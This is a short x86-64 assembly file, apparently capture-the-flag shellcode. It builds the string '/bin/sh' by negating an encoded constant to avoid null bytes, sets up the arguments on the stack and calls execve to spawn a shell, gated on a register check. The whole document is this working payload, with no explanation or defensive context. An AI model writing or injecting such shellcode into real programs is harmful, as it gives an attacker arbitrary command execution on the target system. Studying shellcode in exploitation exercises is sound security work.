
section .text
    global _start

_start:
    mov r10, rax
    ;call RET
;filename:	db 'flag', 0x00
;RET:
	;pop rax
    xor eax, eax
    mov rbx, 0xFF978CD091969DD1
    neg rbx
    push rbx
    ;mov rdi, rsp
    push rsp
    pop rdi
    cdq
    push rdx
    push rdi
    ;mov rsi, rsp
    push rsp
    pop rsi
    cmp     r10, 0x4141414
    jbe end
    mov al, 0x3b
	syscall
end:
    mov    rdx, 0x12345678
